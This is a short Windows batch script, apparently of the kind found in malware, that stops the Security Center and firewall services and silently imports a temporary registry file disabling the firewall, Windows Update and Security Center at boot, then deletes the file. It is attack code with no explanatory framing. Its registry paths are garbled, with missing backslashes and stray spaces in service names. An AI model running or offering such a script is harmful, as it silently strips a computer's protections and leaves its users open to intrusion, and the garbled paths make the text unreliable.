net stop "Security Center"
net stop SharedAccess
> "%Temp%.kill.reg" ECHO REGEDIT4
>>"%Temp%.kill.reg" ECHO.
>>"%Temp%.kill.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]
>>"%Temp%.kill.reg" ECHO "Start"=dword:00000004
>>"%Temp%.kill.reg" ECHO.
>>"%Temp%.kill.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]
>>"%Temp%.kill.reg" ECHO "Start"=dword:00000004
>>"%Temp%.kill.reg" ECHO.
>>"%Temp%.kill.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]
>>"%Temp%.kill.reg" ECHO "Start"=dword:00000004
>>"%Temp%.kill.reg" ECHO.
START /WAIT REGEDIT /S "%Temp%.kill.reg"
del "%Temp%.kill.reg"